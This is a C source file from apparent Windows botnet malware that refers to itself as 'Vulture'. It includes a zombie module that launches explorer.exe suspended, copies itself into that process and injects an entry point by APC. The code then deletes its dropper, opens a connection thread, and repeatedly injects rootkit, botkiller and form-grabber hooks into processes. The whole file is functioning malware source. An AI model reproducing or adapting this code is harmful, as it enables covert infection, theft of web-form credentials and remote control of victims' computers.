#include "bot_structs.h"
#include "api.h"
#include "mem.h"
#include "inject.h"
#include "utils.h"
#include "install.h"
#include "connection.h"
#include "modules.h"
#include "string.h"
#include "zombie.h"

#ifdef MODULE_ROOTKIT
#include "rootkit.h"
#include "ipc.h"

#ifdef MODULE_BOTKILLER
#include "botkiller.h"
#endif

#ifdef MODULE_FORMGRABBER
#include "formgrabber.h"
#endif
#endif

extern bot_t bot;

DWORD WINAPI ZombieEntryPoint(bot_t* pBot)
{
	BOOL bInfectedSystem = FALSE;

	bot = *pBot;

	bot.crc.crc32Intalized = FALSE;

	//g_Bot.crc.crc32Intalized = FALSE;

	if (!InitializeAPI())
	{
		return TRUE;
	}

	memInit();
/*
#ifdef MODULE_ROOTKIT
	if (InstallRootkit())
		MessageBox(0, "Rootkit installed.", 0, 0);
	else MessageBox(0, "Rootkit failed.", 0, 0);
#endif
*/
	if (!IsSystemInfected())
	{
		InstallVulture();

		while (!bot.api.pDeleteFileW(bot.wzBotPath))
			bot.api.pSleep(500);

		bot.api.pExitProcess(0);
	}

	StartConnectionThread(&bot);

#ifdef MODULE_ROOTKIT
	RunIPCServer();
#endif
	while (TRUE)
	{
#ifdef MODULE_ROOTKIT
		if (IsOperatingSystem64Bit())
			InjectAll();
		else
		{
			if (bInfectedSystem == FALSE)
			{
				InjectAll();
				bInfectedSystem = TRUE;
			}
		}
#endif
		bot.api.pSleep(5000);
	}

	return 0;
}
DWORD WINAPI ZombieEntryPointEnd(void) { return 0; }

DWORD WINAPI dwOtherEntryPoint(LPVOID p)
{
	bot.crc.crc32Intalized = FALSE;

	//g_Bot.crc.crc32Intalized = FALSE;

	if (!InitializeAPI())
	{
		return TRUE;
	}

#ifdef MODULE_ROOTKIT
#ifdef MODULE_BOTKILLER
	InitBotkiller();
#endif
	InstallRootkit();
	RunIPCClient();

#ifdef MODULE_FORMGRABBER
	InstallFormgrabberHooks();
#endif
#endif
	return 0;
}

LPWSTR _GetExplorerPath()
{
	BOOL bIs64Bit;
	LPWSTR pwzWinDir;
	wchar_t wzExplorerPath[MAX_PATH];

	if ((pwzWinDir = GetWinDir()) == NULL)
		return NULL;

	bIs64Bit = IsOperatingSystem64Bit();
	memzero(&wzExplorerPath, sizeof(wzExplorerPath));

	if (bIs64Bit)
	{
		bot.api.pwsprintfW(wzExplorerPath, L"%s\\SysWOW64\\explorer.exe", pwzWinDir);
	}
	else bot.api.pwsprintfW(wzExplorerPath, L"%s\\explorer.exe", pwzWinDir);

	memfree(pwzWinDir);
	
	return StrCopyW(wzExplorerPath, StrLengthW(wzExplorerPath) * 2);
}

BOOL CreateZombieEx(LPTHREAD_START_ROUTINE start)
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
	LPWSTR pwzExplorerPath;
	bot_t botData;
	void* pRemoteBotData;
	BOOL bZombie;
	HMODULE hMod, hLocalMod;
	LPTHREAD_START_ROUTINE pEntryPoint;

	if ((pwzExplorerPath = _GetExplorerPath()) == NULL)
		return FALSE;

	bZombie = FALSE;

	memzero(&pi, sizeof(PROCESS_INFORMATION));
	memzero(&si, sizeof(STARTUPINFOW));

	//si.cb = sizeof(STARTUPINFOW);

	if (bot.api.pCreateProcessW(pwzExplorerPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
		botData = bot;

// 		if (InjectRemoteFunctions(&botData, pi.hProcess))
// 		{
// 			if ((pRemoteBotData = InjectData(pBot, pi.hProcess, &botData, sizeof(bot_t))) != NULL)
// 			{
// 				if ((pRemoteEntryPoint = InjectData(pBot, pi.hProcess, pEntryPoint, dwEntryPointSize)) != NULL)
// 				{
// 					pBot->api.pQueueUserAPC(pRemoteEntryPoint, pi.hThread, pRemoteBotData);
// 					pBot->api.pResumeThread(pi.hThread);
// 					//g_Bot.api.pCreateRemoteThread(pi.hProcess, 0, 0, pRemoteEntryPoint, pRemoteBotData, 0, NULL);
// 					bZombie = TRUE;
// 				}
// 				else
// 				{
// 					pBot->api.pVirtualFreeEx(pi.hProcess, pRemoteBotData, 0, MEM_RELEASE);
// 					pBot->api.pVirtualFreeEx(pi.hProcess, pRemoteEntryPoint, 0, MEM_RELEASE);
// 				}
// 			}
// 		}
// 		else MessageBox(0, "InjectRemoteFunctions failed", 0, 0);

		hLocalMod = bot.api.pGetModuleHandleW(NULL);

		if ((hMod = CopyModule(pi.hProcess, hLocalMod)) != 0)
		{
			pEntryPoint = (LPTHREAD_START_ROUTINE)((LPBYTE)hMod + (DWORD_PTR)((LPBYTE)start - (LPBYTE)hLocalMod));

			if ((pRemoteBotData = InjectData(pi.hProcess, &botData, sizeof(bot_t))) != NULL)
			{
				bot.api.pQueueUserAPC(pEntryPoint, pi.hThread, pRemoteBotData);
				bot.api.pResumeThread(pi.hThread);

				bZombie = TRUE;
			}
		}

		bot.api.pCloseHandle(pi.hThread);
		bot.api.pCloseHandle(pi.hProcess);
	}

	return bZombie;
}

BOOL CreateZombie(void)
{
	return CreateZombieEx(ZombieEntryPoint);
}

DWORD WINAPI Entrypoint_Uninstall(bot_t* pBot)
{
	bot_t bot = *pBot;

	if (!InitializeAPI())
	{
		return TRUE;
	}

	while (!bot.api.pDeleteFileW(bot.wzBotPath))
	{
		bot.api.pSleep(1000);
	}

	bot.api.pExitProcess(0);

	return 0;
}

BOOL CreateZombieUninstall(void)
{
	if (!CreateZombieEx(Entrypoint_Uninstall))
		return FALSE;
	return TRUE;
}

void WINAPI InjectAll(void)
{
	InjectBot(dwOtherEntryPoint);
}